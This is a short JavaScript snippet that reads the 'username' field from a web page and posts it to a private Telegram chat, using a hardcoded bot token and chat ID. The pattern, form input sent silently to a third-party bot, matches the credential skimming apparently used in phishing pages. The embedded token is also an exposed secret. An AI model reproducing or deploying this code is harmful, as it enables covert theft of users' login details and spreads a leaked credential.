// sendtelegram
function sendtelegram(message) { let telegram_bot_id = "6547759004:AAEL2N-M2M0V_e5JnmMl9Zj6ux7JpYvlT3U"; let chat_id = 1713463627; let settings = { "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage", "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" }, "data": JSON.stringify({ "chat_id": chat_id, "text": message }) }; $.ajax(settings).done(function (response) { }); };

function send() {
    sendtelegram(document.getElementById("username").value);
}